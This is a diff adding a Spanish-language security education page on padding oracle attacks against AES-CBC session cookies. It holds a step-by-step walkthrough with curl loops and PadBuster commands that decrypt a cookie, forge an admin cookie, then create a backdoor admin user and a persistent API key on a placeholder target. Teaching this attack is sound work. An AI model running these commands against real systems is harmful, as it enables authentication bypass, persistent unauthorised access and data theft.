-		sibling = document.querySelector( '.wp-site-blocks' );
-
-		// Early exit if the root element was not found.
-		if ( ! sibling ) {
-			return;
-		}
-
-		// Get the skip-link target's ID, and generate one if it doesn't exist.
-		skipLinkTargetID = skipLinkTarget.id;
-		if ( ! skipLinkTargetID ) {
-			skipLinkTargetID = 'wp--skip-link--target';
-			skipLinkTarget.id = skipLinkTargetID;
-		}
-
-		// Create the skip link.
-		skipLink = document.createElement( 'a' );
-		skipLink.classList.add( 'skip-link', 'screen-reader-text' );
-		skipLink.href = '#' + skipLinkTargetID;
-		skipLink.innerHTML = 'Saltar al contenido';
-
-		// Inject the skip link.
-		sibling.parentElement.insertBefore( skipLink, sibling );
-	}() );</script>
+<body>
+    <div class="animated-bg"></div>
+    <div class="matrix-rain" id="matrix-rain"></div>
+
+    <div class="container">
+        <header class="header">
+            <a href="../" class="back-link"><i class="fas fa-arrow-left"></i>Volver al inicio</a>
+            <div class="logo-container">
+                <div class="logo-matrix"><div class="logo-text">&lt;/&gt;</div></div>
+            </div>
+            <h1>Manipulación de Cookies - Padding Oracle</h1>
+            <p class="subtitle">Ataques Criptográficos y Bypass de Autenticación</p>
+        </header>
+
+        <main>
+            <section class="section">
+                <h2><i class="fas fa-cookie"></i>¿Qué es un Padding Oracle Attack?</h2>
+                
+                <div class="alert alert-definition">
+                    <p>Un <strong>Padding Oracle Attack</strong> explota vulnerabilidades en el cifrado CBC (Cipher Block Chaining) cuando una aplicación revela información sobre la validez del padding de los datos descifrados. Permite descifrar datos cifrados sin conocer la clave.</p>
+                </div>
+
+                <h3>Requisitos para la vulnerabilidad:</h3>
+                <ul>
+                    <li><strong>Cifrado CBC:</strong> AES-CBC, 3DES-CBC, etc.</li>
+                    <li><strong>Oracle de padding:</strong> Respuestas diferenciadas según padding válido/inválido</li>
+                    <li><strong>Acceso a ciphertext:</strong> Capacidad de modificar datos cifrados</li>
+                    <li><strong>Feedback del servidor:</strong> Error messages, timing, HTTP codes</li>
+                </ul>
+
+                <div class="alert alert-danger">
+                    <p><strong>Impacto:</strong> Descifrado de tokens de sesión, bypass de autenticación, obtención de datos sensibles cifrados.</p>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-lock-open"></i>Fundamentos Criptográficos</h2>
+                
+                <div class="crypto-flow">
+                    <div class="crypto-card">
+                        <div class="crypto-title">CBC Mode</div>
+                        <p>Cada bloque de plaintext se XOR con el bloque cifrado anterior antes del cifrado.</p>
+                        <div class="code-block">
+                            <code>C₁ = E(P₁ ⊕ IV)
+C₂ = E(P₂ ⊕ C₁)
+C₃ = E(P₃ ⊕ C₂)</code>
+                        </div>
+                    </div>
+                    
+                    <div class="crypto-card">
+                        <div class="crypto-title">PKCS#7 Padding</div>
+                        <p>Relleno estándar que añade bytes cuyo valor indica la cantidad de padding.</p>
+                        <div class="code-block">
+                            <code>Data: [68 65 6c 6c 6f]
+Padded: [68 65 6c 6c 6f 03 03 03]</code>
+                        </div>
+                    </div>
+                </div>
+
+                <h3>Vectores de Oracle típicos:</h3>
+                <ul>
+                    <li><strong>Error messages:</strong> "Invalid padding" vs "Invalid data"</li>
+                    <li><strong>HTTP status:</strong> 500 vs 200, 403 vs 404</li>
+                    <li><strong>Timing attacks:</strong> Diferencias en tiempo de respuesta</li>
+                    <li><strong>Content changes:</strong> Cambios en página devuelta</li>
+                </ul>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-server"></i>Caso Práctico: Padding Oracle Attack</h2>
+
+                <div class="example">
+                    <div class="example-title">
+                        <i class="fas fa-cookie"></i>
+                        Explotación de Padding Oracle en Cookie de Sesión
+                    </div>
+
+                    <div class="machine-info">
+                        <strong>Escenario del ataque:</strong>
+                        <ul>
+                            <li><strong>Objetivo:</strong> Descifrar cookie de sesión y obtener bypass de autenticación</li>
+                            <li><strong>Vulnerabilidad:</strong> Cifrado AES-CBC con oracle de padding vía error messages</li>
+                            <li><strong>Herramientas:</strong> PadBuster, scripts Python, Burp Suite, CyberChef</li>
+                            <li><strong>Resultado esperado:</strong> Descifrado de datos sensibles y generación de tokens válidos</li>
+                        </ul>
+                    </div>
+
+                    <h4>Metodología de Explotación:</h4>
+                    <div class="attack-flow">
+                        <div class="flow-step">
+                            <div class="flow-number">1</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Detección</div>
+                                <div class="flow-desc">Identificación de oracle de padding mediante análisis de respuestas</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">2</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Análisis Criptográfico</div>
+                                <div class="flow-desc">Determinación de algoritmo, block size y estructura de datos</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">3</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Descifrado</div>
+                                <div class="flow-desc">Explotación del oracle para descifrar datos bloque por bloque</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">4</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Cifrado Malicioso</div>
+                                <div class="flow-desc">Creación de cookies válidas con datos controlados por el atacante</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">5</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Bypass Completo</div>
+                                <div class="flow-desc">Acceso administrativo mediante cookies maliciosas generadas</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <h4>Fase 1: Detección del Padding Oracle</h4>
+                    <div class="code-block">
+                        <div class="code-label">Análisis de respuestas</div>
+                        <code># Cookie original capturada
+original_cookie="YWRtaW5pc3RyYXRvcgAAAAAAAAAA%2BvX7qF4%2BZ3Q%3D"
+
+# Test padding oracle - Modificar último byte
+curl -H "Cookie: session=$modified_cookie" http://target.com/dashboard
+# HTTP 500: "Padding is invalid" = Oracle detectado!
+
+# Confirmar oracle con múltiples modificaciones
+for i in {0..255}; do
+    modified=$(echo "$original_cookie" | modify_last_byte $i)
+    response=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: session=$modified" http://target.com/)
+    echo "Byte $i: HTTP $response"
+done</code>
+                    </div>
+
+                    <div class="alert alert-info">
+                        <p>Oracle confirmado: modificaciones del último byte generan respuestas HTTP 500 con mensaje "Invalid padding" versus respuestas normales.</p>
+                    </div>
+
+                    <h4>Fase 2: Descifrado con PadBuster</h4>
+                    <div class="code-block">
+                        <div class="code-label">PadBuster - Automatic Decrypt</div>
+                        <code># Ejecutar PadBuster para descifrar cookie completa
+padbuster.pl http://target.com/dashboard \
+    "YWRtaW5pc3RyYXRvcgAAAAAAAAAA%2BvX7qF4%2BZ3Q%3D" \
+    8 -cookies -encoding 3
+
+# Parámetros:
+# URL: Endpoint que contiene el oracle
+# Cookie: Valor cifrado a descifrar
+# 8: Block size (AES = 16, DES = 8)
+# -cookies: Oracle en cookies
+# -encoding 3: Base64 + URL encoding
+
+# Output esperado:
+# [+] Decrypted value (ASCII): admin;role=user;timestamp=1640995200</code>
+                    </div>
+
+                    <h4>Fase 3: Cifrado de Datos Maliciosos</h4>
+                    <div class="code-block">
+                        <div class="code-label">PadBuster - Encrypt</div>
+                        <code># Crear cookie maliciosa con privilegios admin
+padbuster.pl http://target.com/dashboard \
+    "YWRtaW5pc3RyYXRvcgAAAAAAAAAA%2BvX7qF4%2BZ3Q%3D" \
+    8 -cookies -encoding 3 -plaintext "admin;role=admin;timestamp=1640995200"
+
+# Resultado: Nueva cookie cifrada con role=admin
+malicious_cookie="bmV3X2FkbWluX2Nvb2tpZQAAAABBQkNE%2F1pL8sKm9zX%3D"
+
+# Verificar bypass de autenticación
+curl -H "Cookie: session=$malicious_cookie" http://target.com/admin/
+# HTTP 200: ¡Acceso administrativo obtenido!</code>
+                    </div>
+
+                    <h4>Fase 4: Post-Explotación</h4>
+                    <div class="code-block">
+                        <div class="code-label">Abuse de privilegios admin</div>
+                        <code># Crear usuario backdoor
+curl -H "Cookie: session=$malicious_cookie" \
+     -X POST \
+     -d "username=backdoor&password=secret123&role=admin" \
+     http://target.com/create_user
+
+# Enumeración de funcionalidades admin
+curl -b "session=$malicious_cookie" http://target.com/admin/users
+curl -b "session=$malicious_cookie" http://target.com/admin/logs
+curl -b "session=$malicious_cookie" http://target.com/admin/config
+
+# Establecer persistencia
+curl -b "session=$malicious_cookie" \
+     -X POST \
+     -d "action=create_api_key&permissions=all" \
+     http://target.com/admin/api</code>
+                    </div>
+
+                    <div class="alert alert-info">
+                        <p><strong>Resultado:</strong> Acceso administrativo completo obtenido mediante bypass criptográfico, capacidad de crear usuarios, acceder a logs sensibles y generar API keys persistentes.</p>
+                    </div>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-toolbox"></i>Técnicas Avanzadas y Variantes</h2>
+                <h3>Optimizaciones del ataque</h3>
+                <ul>
+                    <li><strong>Parallel processing:</strong> Múltiples threads para acelerar descifrado</li>
+                    <li><strong>Smart guessing:</strong> Priorizar caracteres ASCII comunes</li>
+                    <li><strong>Error analysis:</strong> Usar timing attacks cuando no hay error messages</li>
+                    <li><strong>Bit flipping:</strong> Modificaciones controladas para bypass directo</li>
+                    <li><strong>Format prediction:</strong> Explotar formatos conocidos de datos (JSON, XML)</li>
+                </ul>
+
+                <h3>Herramientas especializadas</h3>
+                <div class="code-block">
+                    <div class="code-label">Alternatives to PadBuster</div>
+                    <code># Padding Oracle Attack Tool (Python)
+git clone https://github.com/KishanBagaria/padding-oracle-attacker
+python3 padding_oracle_attacker.py -u http://target.com/login -c session
+
+# Burp Extension - Padding Oracle
+# BApp Store -> "Padding Oracle"
+
+# Custom Python implementation
+# Usar pycryptodome para operaciones criptográficas
+pip3 install pycryptodome requests
+# Implementar lógica personalizada según oracle específico</code>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-exclamation-triangle"></i>Consideraciones Éticas y Legales</h2>
+                <div class="alert alert-danger">
+                    <p><strong>Advertencia Legal:</strong> Este contenido es exclusivamente educativo. Los ataques de padding oracle son ilegales cuando se realizan sin autorización explícita. Úsalos solo en sistemas propios, laboratorios controlados o durante auditorías de seguridad autorizadas por contrato escrito.</p>
+                </div>
+            </section>
+        </main>
+
+        <footer class="footer">
+            <p>&copy; 2024 HackingUsef - Educación en Ciberseguridad</p>
+            <p>Contenido educativo para profesionales de la seguridad informática</p>
+        </footer>
+    </div>
+
+    <script>
+        function createMatrixRain() {
+            const container = document.getElementById('matrix-rain');
+            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン</>(){}[]⊕∀∃∈∉⟨⟩';
+            for (let i = 0; i < 50; i++) {
+                const column = document.createElement('div');
+                column.className = 'matrix-column';
+                column.style.left = Math.random() * 100 + '%';
+                column.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                column.style.animationDelay = Math.random() * 2 + 's';
+                let text = '';
+                for (let j = 0; j < 20; j++) text += chars[Math.floor(Math.random() * chars.length)] + '<br>';
+                column.innerHTML = text;
+                container.appendChild(column);
+            }
+        }
+        document.addEventListener('DOMContentLoaded', createMatrixRain);
+    </script>
 </body>
 </html>
